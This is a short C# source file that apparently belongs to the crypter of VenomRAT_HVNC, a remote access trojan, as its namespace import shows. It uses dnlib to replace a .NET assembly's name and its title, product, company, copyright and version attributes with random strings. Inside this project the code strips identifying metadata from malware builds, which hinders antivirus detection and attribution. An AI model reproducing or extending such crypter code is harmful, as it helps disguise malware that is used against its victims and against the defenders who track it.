using System;
using System.Linq;
using dnlib.DotNet;
using VenomRAT_HVNC.Crypter.Settings;

namespace Client.Obfuscation.SimpleTechObfuscate;

public class Assembly
{
    public static void Obfuscate(ModuleDef md)
    {
        // obfuscate assembly name
        string encName = new GenerateKey(10).GenerateStrenghCharacter();
        Console.WriteLine($"{md.Assembly.Name} -> {encName}");
        md.Assembly.Name = encName;

        // obfuscate Assembly Attributes(AssemblyInfo) .rc file
        string[] attri = { "AssemblyDescriptionAttribute", "AssemblyTitleAttribute", "AssemblyProductAttribute", "AssemblyCopyrightAttribute", "AssemblyCompanyAttribute","AssemblyFileVersionAttribute"};
        // "GuidAttribute", and assembly version can also be changed
        foreach (CustomAttribute attribute in md.Assembly.CustomAttributes) {
            if (attri.Any(attribute.AttributeType.Name.Contains)) {
                string encAttri = new GenerateKey(10).GenerateStrenghCharacter();
                Console.WriteLine($"{attribute.AttributeType.Name} = {encAttri}");
                attribute.ConstructorArguments[0] = new CAArgument(md.CorLibTypes.String, new UTF8String(encAttri));
            }
        }
    }
}